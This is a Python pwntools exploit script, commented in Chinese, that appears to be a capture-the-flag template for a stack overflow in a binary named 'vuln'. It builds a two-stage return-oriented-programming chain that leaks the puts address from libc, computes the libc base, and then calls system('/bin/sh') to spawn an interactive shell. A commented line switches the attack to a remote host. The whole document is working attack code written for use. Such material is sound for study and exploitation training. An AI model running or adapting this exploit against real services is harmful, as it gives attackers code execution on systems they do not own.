#!/usr/bin/env python3
from pwn import *

from pwn import ROP,context,log,ELF,process,remote,u64

# 1. 基础环境配置，Arch 玩家必须对自己的架构了如指掌
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug' # 开启调试输出，看着数据流向是种享受

# 2. 加载目标文件和你的本地 libc
# 在 Arch 上，libc 通常在这个位置。如果打远程题，记得换成题目提供的 libc 文件
elf = ELF('./vuln')
libc = ELF('/usr/lib/libc.so.6') 

p = process('./vuln')
# p = remote('x.x.x.x', 1337) # 远程实战切这里

# ==========================================
# Stage 1: 构造 ROP 链泄露 libc 地址
# ==========================================
rop1 = ROP(elf)
# 优雅的 Auto-magic：自动寻找 pop rdi，调用 puts(puts@got)
rop1.puts(elf.got['puts']) 
# 泄露完千万别死，跳回 main 函数重新开始
rop1.main()

# 假设计算出的溢出 padding 为 72 字节
padding = b'A' * 72
payload1 = padding + rop1.chain()

# 发送第一波攻击
p.recvuntil(b"> ") # 等待输入提示符
p.sendline(payload1)

# ==========================================
# 解析泄露出的内存地址
# ==========================================
# 接收程序返回的 puts 地址（通常是 6 字节），并用 00 补齐到 8 字节后解包 (unpack)
p.recvline() # 可能需要根据实际输出吞掉多余的换行
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"Got leaked puts@GLIBC: {hex(leaked_puts)}")

# ==========================================
# Stage 2: 计算基址，发动致命一击
# ==========================================
# 核心公式：动态更新 libc 对象的基址
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Calculated libc base address: {hex(libc.address)}")

# 既然基址都有了，直接用 libc 的 ROP 对象组装 Payload
rop2 = ROP(libc)
# 用 ROP 直接组装 system("/bin/sh")，由于基址已经更新，pwntools 会自动计算真实地址
rop2.system(next(libc.search(b'/bin/sh\x00')))

payload2 = padding + rop2.chain()

# 程序此时已经回到了 main，发送第二波致命 Payload
p.recvuntil(b"> ")
p.sendline(payload2)

# 尽情享受你的 Shell 吧
p.interactive()
